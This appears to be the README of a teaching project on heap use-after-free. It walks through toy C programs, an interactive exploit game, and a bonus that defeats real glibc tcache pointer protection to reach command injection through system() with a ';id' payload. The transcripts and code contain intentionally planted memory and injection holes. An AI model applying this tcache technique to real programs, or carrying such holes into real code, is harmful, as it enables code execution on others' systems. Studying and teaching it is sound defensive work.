# Use-After-Free — how it works, and how to exploit it

A small set of C programs for learning heap use-after-free (UAF).
Everything here is intentionally simple: short files, plain variable
names, one bug per program, and a lot of comments.

```
uaf_example/
├── README.md                        <- you are here
├── Makefile                         <- builds everything
├── 01_basic_uaf.c                   <- the bug, in 50 lines
├── 02_heap_reuse.c                  <- the simplest exploit: reuse
├── 03_uaf_game.c                    <- the assignment: an interactive heap game
├── 04_bonus_glibc_tcache.c          <- the same exploit against real glibc
├── 05_heap_grooming.c               <- bonus exercise: heap grooming (order matters)
├── 06_uaf_handler.c                 <- bonus exercise: UAF via handler pointer redirect
```

---

## 1. What is a use-after-free?

Memory that programs use (other than the few registers and the stack)
comes from the **heap**: a big pool of memory that the program rents
out in pieces called **chunks**.

```
   the heap
   +--------+--------+--------+--------+--------+
   | chunk A| chunk B| chunk C| chunk D| (free) |
   +--------+--------+--------+--------+--------+
```

Renting and returning works with two functions:

```c
char *p = malloc(16);   // rent 16 bytes of heap
free(p);                // return them: "I'm done with this chunk"
```

Here is the important part: **`free()` does not erase the memory.**
It only marks the chunk as "available to rent again". The bytes that
were in it are still there.

A **use-after-free** happens when a program keeps using a chunk after
giving it back — through the old pointer, which is now called a
**dangling pointer**:

```c
char *p = malloc(16);
strcpy(p, "hello");
free(p);            // the chunk is returned, but p still holds the
                    // address — p is now dangling
printf("%s", p);    // USE-AFTER-FREE: reading memory we no longer own
```

That is the whole bug. There are two ways it hurts a program:

1. **Stale or attacker-chosen reads** — the program makes decisions
   based on data it thinks is its own, but the chunk may have been
   re-rented to someone else.
2. **Attacker-chosen writes** — if the program also *writes* through
   the dangling pointer, the attacker can put arbitrary data at an
   address they pick. That is an **arbitrary write**, and from there
   to "the program does what I say" is a short walk.

## 2. Why is that dangerous in a real program?

In real C programs, heap chunks very often contain **pointers to code**:
vtable pointers (what `obj->method()` actually calls), function
pointers, jump targets. If a UAF lets an attacker swap out that data,
the next time the program follows that pointer, it jumps to attacker
memory. That is the classic "UAF -> code execution" chain.

The three programs below are the chain, split into small steps.

## 3. Building

```
make            # builds uaf1, reuse, desk, tcache, groom, handler
```

or by hand:

```
gcc -g -O0 -no-pie -fno-pic -o desk 03_uaf_game.c
```

What those flags mean, and why we use them:

| flag | why |
|---|---|
| `-g` | debug info, so gdb can show names |
| `-O0` | no optimization: variables live where the source says, no surprises |
| `-no-pie` | the binary gets **fixed addresses** at build time. Without this, addresses change on every run (ASLR) and you could not write the exploit down. With it, the cleanup parameter's address is the same in every run and easy to type. |

On top of `-no-pie`, the `Makefile` **pins** the two things you type —
the cleanup parameter and the fake heap — to the same round addresses on
every build, on any toolchain, with two linker flags:

```
-Wl,--section-start=.uaf_param=0x4a0000   # the parameter  -> 0x4a0000
-Wl,--section-start=.uaf_heap=0x4b0000    # the boxes/pool  -> 0x4b0000
```

(The sources put `cleanup_param` in a `.uaf_param` section and the heap
array in `.uaf_heap` with `__attribute__((section(...)))`; the flags
nail those sections down.) So in `desk`, `groom` and `handler` the
parameter is **always `0x4a0000`** and the heap **always starts at
`0x4b0000`** — the transcripts below are exactly what you will see.

### Finding the addresses on your machine

Because the parameter and heap are pinned (see above), the addresses are
the **same on every build** — `0x4a0000` and `0x4b0000` — so the
transcripts in this README match your binary exactly. You never have to
guess. Three ways to confirm it, any of which works:

1. **Run the game and type `map`.** It prints the cleanup parameter's
   address, the boxes, and the free list. This is the intended way —
   you only ever need addresses the desk itself told you.
2. **Ask the binary after building:**

   ```
   $ nm desk | grep -w cleanup_param
   00000000004a0000 d cleanup_param
   ```

   (or `objdump -t desk | grep -w cleanup_param` — same answer).
   With the pinning flags this is exactly the address the program will
   have at runtime.
3. **gdb**, if you want to see it live:

   ```
   (gdb) p &cleanup_param
   $1 = 0x4a0000
   ```

Same for the grooming desk: `nm groom | grep -w cleanup_param`.

### Tested environments

Verified on **Debian 12** — gcc 12.2, glibc 2.36 — which is exactly
what **Kali Linux 2022.x** ships (Kali is Debian-based; 2022 releases
are Debian 12-based), so all of the above is expected to work as-is
there. Requirements per program:

| program | needs | Kali 2022.x |
|---|---|---|
| uaf1, reuse, desk, groom | gcc, 64-bit Linux | OK |
| tcache | glibc ≥ 2.29 with tcache (Kali has 2.36) | OK |

With `-no-pie` plus the section-pinning flags, `cleanup_param` and the
heap are at fixed, known addresses regardless of ASLR, so the "ASLR off"
assumption is not even needed — every build matches the transcripts here.

---

## 4. Program 1 — seeing the bug (`uaf1`)

`01_basic_uaf.c` is the whole bug in ~50 lines:

```
$ ./uaf1
note: hello students
note was freed, printing again...
note: <garbage — the chunk is free, someone may have reused it>
```

`add_note()` rents a chunk, `free_note()` returns it, and `print_note()`
still reads through the old pointer. That read is the use-after-free.

You can watch it in gdb — stop right at the UAF read and see what the
dangling pointer is actually holding now (tested session, verbatim):

```
$ gdb -q -batch -ex 'break print_note' -ex 'ignore 1 1' -ex 'run' \
    -ex 'p text' -ex 'x/s text' ./uaf1
Breakpoint 1, print_note () at 01_basic_uaf.c:37
37	    printf("note: %s\n", text);
$1 = 0x30fff2a0 "\377\017\003"     <- the chunk was freed; this is not our text
0x30fff2a0:	"\377\017\003"
```

(`ignore 1 1` skips the first, legitimate call to `print_note`.) The
same trick works in the games: break at `desk_put`, run the exploit
sequence, and `x/s free_head` shows the freed corner holding the
"next" pointer right before the UAF write overwrites it:

```
Breakpoint 1, desk_put (mine=1, text=0x7fffffffdec7 "0x4a0000") at 03_uaf_game.c:159
(gdb) p held[mine]
$1 = 0x4b0020 <boxes+32> "4b0040"      <- "4b0040": the next free box, as text
```

The freed box's corner holds `4b0040` — the address of the next free box,
written as ASCII — right up until the UAF write replaces it.

## 5. Program 2 — the simplest exploit: reuse (`reuse`)

`02_heap_reuse.c` shows the first exploitation step: **heap reuse**.

```
$ ./reuse
victim: secret: top-secret
victim: secret: PWNED        <- the same address, new data
```

The sequence:

```c
char *victim  = malloc(64);   // 1. program rents a chunk
strcpy(victim, "secret: top-secret");
free(victim);                 // 2. BUG: returned, pointer kept
char *attacker = malloc(64);  // 3. attacker's malloc gets the SAME chunk
strcpy(attacker, "secret: PWNED");
printf("%s", victim);         // 4. program reads attacker data
```

Why does `malloc(64)` in step 3 return exactly the freed chunk?
Because the allocator keeps a list of free chunks and the most
convenient one is the one it just gave back. The program in step 4
believes it is reading its own data — it is reading the attacker's.

In a real program, step 4 is usually not a `printf`: it is a pointer
that gets called, followed, or compared. That is where reuse becomes
powerful — and where the next program comes in.

## 6. Program 3 — the assignment: the storage desk (`desk`)

This is the one to play with. `03_uaf_game.c` is an interactive game:
a tiny "storage desk" rents you boxes from its own heap. Somewhere in
the program is a **global parameter** — `cleanup` — that a cleanup
function hands to `system("echo " + parameter)`. **Your job is to gain
write access to that parameter through the heap, rewrite it, and then
let the program use it.**

### The world

- The heap is 8 boxes of 32 bytes, in a row.
- Each box has a **corner** (first 16 bytes) and a **message** (16 bytes).
- When a box is freed, the desk writes the address of the *next free
  box* into the freed box's corner — as **plain ASCII hex**, so you can
  read it and type it. (This is exactly what real allocators do; the
  only difference is that they store raw 8-byte pointers instead of text.)
- When the desk hands out a box, it reads the next address out of
  that box's corner. The corners **are** the free list.

### The rules (this is what keeps the game honest)

Every `alloc` hands you a **pointer** (P0, P1, ...). You may only read
and write through a pointer you hold — i.e. only in the memory the desk
has actually handed to you. **There is no command that touches the
parameter directly**: typing its address as a target does nothing until
you hold a pointer to it. So the parameter can only be rewritten if the
*desk* hands you a pointer that happens to point at it.

### The bug

When you `free` a pointer, the desk does not break it. It stays in your
pocket, **dangling** — and the desk still lets you `put` text through it.
Writing through a dangling pointer is a **use-after-free**. And since
your write lands in the freed box's corner too, you can rewrite *where
the free list points next*.

### The win (command injection)

Once you can write the parameter, the `run` command is what makes it
hurt: the cleanup function does

```c
system("echo " + parameter);   /* really: snprintf(cmd, "echo %s", param); system(cmd); */
```

`system()` passes the whole string to a shell, so the parameter is not
just data — it is part of a command line. If you can write `;id` into
it, the shell runs `echo` **and then** `id`:

```
uid=1000(student) gid=1000(student) groups=1000(student)
```

That is the classic UAF → arbitrary write → **command injection**
chain. (`;id` is the classic payload; the game wins whenever the
parameter is no longer what the program started it as.)

### Commands

```
alloc [size]         ask the desk for memory; it hands you Pn
free  <Pn>           hand a pointer back (it becomes DANGLING)
put   <Pn> text      write through a pointer you hold (works even dangling — that's the bug)
get   <Pn>           read through a pointer you hold
map                  show the heap, the free list, the parameter and your pointers
run                  run the cleanup: system("echo " + parameter)
hint                 the desk thinks out loud
quit
```

`<Pn>` may also be the *address* of a pointer you hold — but never
anything you do not hold. (A box number like `0` is not a target any
more; use the pointer the desk gave you for that box.)

The keyboard is handled: a bare Enter just re-prompts, pasted text with
Windows line endings (`\r\n`) is stripped, and a line longer than the
buffer is swallowed whole instead of leaking into the next command.

### Why the exploit works (read this before or after, not instead of)

The desk learns the next address from the corner of the box it is
about to hand out. So:

1. `alloc`, `alloc` → you hold P0 (box 0) and P1 (box 1);
2. `free P1` → P1 is dangling, and box 1's corner now holds "next
   free";
3. write through the dangling P1 (the UAF) and replace that corner's
   value with the **parameter's address** (you can read it from `map`);
4. `alloc` → the desk hands out the box with the poisoned corner, and
   its idea of "next free" is now the parameter;
5. `alloc` → the desk hands out **the parameter itself**, and you now
   hold a pointer to it (this is the only way the parameter becomes
   writable);
6. write your text through that pointer — `;id` is the classic payload;
7. `run` → the cleanup does `system("echo " + parameter)` and the
   shell runs your injected command.

Step 7 is the payoff: the desk was writing to a place that is *not a
box at all*, and the program trusted that memory when it ran cleanup.

### Do it

```
$ ./desk
the storage desk. goal: gain write access to the cleanup parameter,
then run the cleanup and watch it do more than echo.
...
desk> alloc
the desk hands you P0 -> 0x4b0000 (you asked for 8 bytes)
desk> alloc
the desk hands you P1 -> 0x4b0020 (you asked for 8 bytes)
desk> put 0x4a0000 PWNED
you may only write through a pointer you hold.   <- no direct write
desk> free P1
you handed P1 back. the desk writes the next free box into the corner of 0x4b0020:
4b0040
  P1 is now DANGLING — and the desk still lets you use it (that is the bug).
desk> map
heap:
  box 0   0x4b0000   in use   corner: 4b0020
  box 1   0x4b0020   FREE   corner: 4b0040
  box 2   0x4b0040   FREE   corner: 4b0060
  box 3   0x4b0060   FREE   corner: 4b0080
  ...
param:
  cleanup  0x4a0000   "all_ok"   (parameter of cleanup_run())
free list head: 0x4b0020
your pointers:
  P0   0x4b0000   live
  P1   0x4b0020   DANGLING
desk> put P1 0x4a0000                             <- THE UAF WRITE
wrote 8 bytes through P1 -> 0x4b0020 (DANGLING — use-after-free). corner now says: 0x4a0000
desk> alloc
the desk hands you P2 -> 0x4b0020 (you asked for 8 bytes)
desk> alloc
the desk hands you P3 -> 0x4a0000 (you asked for 8 bytes)
  (hmm, that is not one of our boxes...)
  (you now hold a pointer to the cleanup parameter.)
desk> put P3 ;id
wrote 3 bytes through P3 -> 0x4a0000. corner now says: ;id
desk> run
echo: ;id
uid=1000(student) gid=1000(student) groups=1000(student)     <- the shell ran `id`
  (the cleanup parameter is not what it started as —
  you have command-injection power here.)
desk> quit
---
cleanup parameter at start: all_ok
cleanup parameter at end:   ;id
>>> the parameter changed. YOU EXPLOITED THE USE-AFTER-FREE! <<<
```

(The parameter is pinned at `0x4a0000` and the heap at `0x4b0000` on
every build, so these are the exact addresses you will type — `map`
always shows them too. The `uid=...` line is whatever user you run as.)

Notes while you play:

- `put P1 0x4a0000` wrote through a **dangling** pointer. A correct
  desk would check "is this memory still yours?" — that check is the
  whole difference between "bug" and "not a bug".
- The parameter only became writable because the desk **handed it to
  you**. Before that, its address was just a number you could type,
  not a pointer you could use.
- You typed the parameter's address **as text**. A real exploit does
  the same thing with raw bytes — typing ASCII is just friendlier.
- Two `alloc`s were needed at the end: the first one consumes the box
  with the poisoned corner, the second one goes where the corner
  points.
- `system("echo " + parameter)` is the hole the injection walks
  through: the parameter is spliced into a command line and handed to
  a shell, so characters like `;`, `&&`, `|` or backticks are shell
  syntax, not data.

### Stretch goals (once you win)

- Win with `;id`, then win again with `&&id` and `;whoami`. Which
  works, and why does `&&id` behave differently?
- Free the same pointer twice (the desk says "already dangling"). What
  did it do to the free list?
- After the desk hands you the parameter, `free` it again. What does
  `map` say about the parameter's "corner" now?

---

## 7. Bonus exercise — heap grooming (order matters)

`05_heap_grooming.c` ("the sorting desk") is the same world as the
storage desk, with one rule that changes everything:

> you may only write into a box you hold — or into the **most
> recently freed** box (that is where the UAF lives). Boxes deeper in
> the free list are not writable.

The free list is LIFO, exactly like glibc's tcache: every `free`
lands a box at the **front**, every `alloc` takes from the front. So
which box is at the front when the exploit fires is decided by the
**order of your frees**. Arranging that order is what "heap grooming"
means.

```
$ ./groom
... (help text) ...
desk> map
heap:
  box 0   0x4b0000   free
  box 1   0x4b0020   free
  box 2   0x4b0040   free
  box 3   0x4b0060   free
  box 4   0x4b0080   program
  box 5   0x4b00a0   program
  cleanup  0x4a0000   "all_ok"   (parameter of cleanup_run())
free list (leftmost is handed out first): box 0 -> box 1 -> box 2 -> box 3
```

The winning line is the same shape as the storage desk — but now you
have to choose the order deliberately, because the box you poison
must be the most recently freed one *at the moment of the poison*,
and its corner must be the one the desk reads next:

```
desk> alloc                    -> box 0 (yours)
desk> free 0                   -> list: box 0 -> box 1 -> box 2 -> box 3
desk> put 0 0x4a0000           -> UAF write: box 0's corner now says 0x4a0000
desk> alloc                    -> pops box 0 (its corner is consumed)
desk> alloc                    -> the desk hands out the PARAMETER
desk> put 0x4a0000 ;id         -> the parameter is now ";id"
desk> run                      -> system("echo ;id") runs `id`
uid=1000(student) gid=1000(student) groups=1000(student)
```

The mistake this punishes: free box 1, then free box 0, then try to
poison box 1. The desk only lets you write into box 0 — the most
recently freed one:

```
desk> free 1
desk> free 0
desk> put 1 0x4a0000
the desk says: you may only write into a box you hold —
or the most recently freed one, if you are feeling lucky.
```

So you must plan the order first — and that planning is the exercise.
Why glibc cares: with a LIFO list you cannot choose which freed chunk
sits where, only the order of your frees can. In a real exploit the
chunk you poison has to be the one `malloc` reads *next*, and every
chunk in front of it has to be one you are willing to receive.

## 8. Bonus exercise — UAF via handler pointer redirect

`06_uaf_handler.c` ("the handler desk") is a different UAF story:
instead of writing the parameter directly, you **redirect a pointer**
that the program dereferences. The lesson is "UAF -> wrong pointer ->
code runs", which is the step between "arbitrary write to a global"
(03/05) and "UAF -> vtable swap -> code execution" (real-world
exploits).

### The world

- A pool of 8 slots of 16 bytes each.
- Two kinds of slot:
  - **DATA** — a plain 16-byte string slot.
  - **HANDLER** — 16 bytes: `[target:8][payload:8]`. The `target`
    field is at offset 0, the same offset the allocator uses for a
    freed slot's "next free" pointer.
- The program's **handler** (`myhandler`) is a HANDLER slot the program
  allocated. At `cleanup`, the program dereferences
  `myhandler->target` and feeds what it points to to a shell:

  ```c
  char *target = *(char **)myhandler;   /* dereference target field */
  system("echo " + target);
  ```

- The parameter is a global string, but **you never write it
  directly**. You make the handler's `target` field point at a slot
  that holds `;id`, and the program's own dereference is what hands the
  exploit to the shell.

### The bug

Freeing a handler does not break the pointer. It stays dangling, and
you can still write through it. Because `target` is at offset 0, a UAF
write to it is also a write to the free-list "next" pointer. One write,
two effects.

### The exploit (two UAF writes)

1. `alloc handler` → P0 (the program's `myhandler`). `target=0` (static).
2. `alloc data` → P1.
3. `free P1` → slot's first 8 bytes = free-list "next".
4. `put P1 0xSLOT2` → **UAF write #1**: P1 (dangling) now points at
   SLOT2 (a DATA slot). The free list is also repointed.
5. `alloc data` → the desk follows P1, hands out SLOT2 → P2.
6. `put P2 ;id` → SLOT2 (now yours, a DATA slot) holds `;id`.
7. `free P0` → `myhandler` freed; its `target` field = free-list "next".
8. `put P0 0xSLOT2` → **UAF write #2 — THE UAF**:
   `myhandler->target` now points at SLOT2.
9. `cleanup` → the program dereferences `myhandler->target`, reads
   `;id`, runs `system("echo ;id")`. The shell runs `id`. COMMAND
   INJECTION.

The parameter itself is never written. The handler's `target` field is
what you poison, and the program's own dereference is what hands you
the write.

### Commands

```
alloc data           allocate a DATA slot (16-byte string)
alloc handler        allocate a HANDLER slot ([target:8][payload:8])
free  <Pn>           hand a pointer back (it becomes DANGLING)
put   <Pn> text      write through a pointer you hold (bug: works even dangling!)
get   <Pn>           read through a pointer you hold
map                  show the pool, param, handler, free list, your pointers
cleanup              the program OWN action: deref handler->target, system("echo "+it)
hint                 the desk thinks out loud
quit
```

### Do it

```
$ ./handler
the handler desk. the program keeps a handler and, at cleanup,
dereferences handler->target and feeds it to the shell.
your job: make that target point at a slot holding ';id'
WITHOUT writing the parameter directly.
...
desk> alloc handler
the desk hands you HANDLER -> 0x4b0000
  (handler layout: [target:8][payload:8])
  (that is the program handler, cleanup will dereference it.)
desk> alloc data
the desk hands you DATA -> 0x4b0010
desk> free P1
you handed data back. its first 8 bytes now hold the free-list next:
4b0020..........
  (it is now DANGLING. the desk still lets you use it. that is the bug.)
desk> put P1 0x4b0020
wrote pointer 0x4b0020 through DATA -> 0x4b0010 (DANGLING, use-after-free)
 .K.............
desk> alloc data
the desk hands you DATA -> 0x4b0010
desk> put P2 ;id
wrote 3 bytes through DATA -> 0x4b0010
;id.............
desk> free P0
you handed handler back. its first 8 bytes now hold the free-list next:
0...............
  (it is now DANGLING. the desk still lets you use it. that is the bug.)
desk> put P0 0x4b0010
wrote pointer 0x4b0010 through HANDLER -> 0x4b0000 (DANGLING, use-after-free)
#.K.............
desk> cleanup
uid=1000(student) gid=1000(student) groups=1000(student)
cleanup: handler target = 0x4b0010, contents: ";id"
  (the handler pointed somewhere OTHER than the parameter.
   the shell ran your bytes. command injection via UAF.)
desk> quit
---
handler target at start: 0x0
handler target at end:   0x4b0010
>>> the handler points somewhere else. YOU REDIRECTED THE CLEANUP! <<<
```

(The pool is pinned at `0x4b0000`, so slot 0 is the handler at
`0x4b0000`, slot 1 the data slot at `0x4b0010`, and the payload lands in
the slot the desk re-hands you — the exact addresses you will type. Note
`put P1 0x4b0020` just repoints the freed slot's "next"; the `;id` ends
up in the slot `alloc` gives back, `0x4b0010`, which is where the handler
is finally aimed.)

### What this teaches (compared to 03/05)

- **03/05**: you write the parameter directly. The exploit is
  "arbitrary write to a global."
- **06**: you write the handler's `target` field. The exploit is
  "UAF -> wrong pointer -> code runs." The program's own dereference
  is what delivers the payload to the shell.
- Both use the same bug (UAF write into a freed object), but 06 is
  closer to real-world exploits where the attacker swaps a vtable
  pointer or a function pointer, not a global string.

## 9. Bonus — why real glibc needs that XOR (`tcache`)

`04_bonus_glibc_tcache.c` does the same exploit against **real glibc
`malloc`**. It fails if you copy the desk's approach verbatim, because
glibc is tougher: it stores every free-list pointer as
`(pointer XOR key)`, with a secret key (the *tcache key*). A naive
overwrite with the parameter's raw address would make `malloc` return
`param XOR key` instead of `param`.

**Why XOR?** glibc does not trust freed memory — the attacker may be
able to write into a freed chunk. If the "next" pointer were stored
raw, one write would be enough to steal the next allocation. XORing
with a secret key means the write must know the key first.

**The trick**: the key is not secret *from the UAF*. Free a chunk that
becomes the only entry in its free list — its "next" is NULL, so its
stored value is `NULL XOR key = key`. One read through the dangling
pointer and the key is known. Then overwrite `(param XOR key)`.

```c
free(a);                                   // a is alone: its corner holds key
unsigned long key = *(unsigned long *)a;   // UAF read: steal the key
free(b);                                   // b becomes the head of the list
*(unsigned long *)b = (unsigned long)cleanup_param ^ key;  // UAF write
char *first = malloc(16);                  // pops b (harmless)
char *victim = malloc(16);                 // pops the parameter
strcpy(victim, ";id");                     // command injection
char cmd[64];
snprintf(cmd, sizeof cmd, "echo %s", cleanup_param);
system(cmd);                               // the shell runs `id`
```

```
$ ./tcache
cleanup parameter before: all_ok (at 0x4a0000)
tcache key (recovered via UAF read): 0x2efbf
malloc returned: 0x2efbf040, then 0x4a0000
cleanup parameter after:  ;id
uid=1000(student) gid=1000(student) groups=1000(student)
(the shell ran `echo` and then `id` — command injection via the UAF)
```

The parameter is pinned at `0x4a0000` (same every run), but the **tcache
key and the glibc heap address change on every run** — that is real
`malloc`, not our desk. The first `malloc` returns a key-dependent heap
address (`0x2efbf040` here, different next time); only the second returns
the parameter at the fixed `0x4a0000`.

Two small things to notice:

- `malloc` returns the chunk it *pops* from the list — so the first
  `malloc` hands back `b`, and only the second hands back the
  parameter. (The desk had the same property: two `alloc`s.)
- glibc's key changes on every run. The UAF read is what makes this
  exploitable *anyway*.

## 10. How do programs defend themselves?

- **Don't keep the pointer.** Set it to `NULL` right after `free()`.
  Reading through NULL crashes loudly instead of silently misbehaving.
- **Know who owns the chunk.** Ownership checks (refcounts, state
  machines) turn "use after free" into "use in the wrong state" —
  still a bug, but a much easier one to find.
- **Ask the compiler.** AddressSanitizer (`-fsanitize=address`)
  poisons freed chunks and crashes the first time they are touched:
  `gcc -g -fsanitize=address -o uaf1_asan 01_basic_uaf.c && ./uaf1_asan`
  Run it and read the report — it names the exact line.
- **Make bugs rare.** In C, fewer raw pointers, shorter lifetimes, and
  smaller chunks mean fewer chances to mix up ownership.

## 11. Vocabulary (one line each)

- **chunk** — a piece of the heap.
- **dangling pointer** — a pointer to a freed chunk.
- **free list** — the allocator's list of chunks that can be re-rented.
- **tcache** — glibc's small fast free list, one per size.
- **arbitrary write** — the ability to write data at any address; the
  end goal of the exploits above.
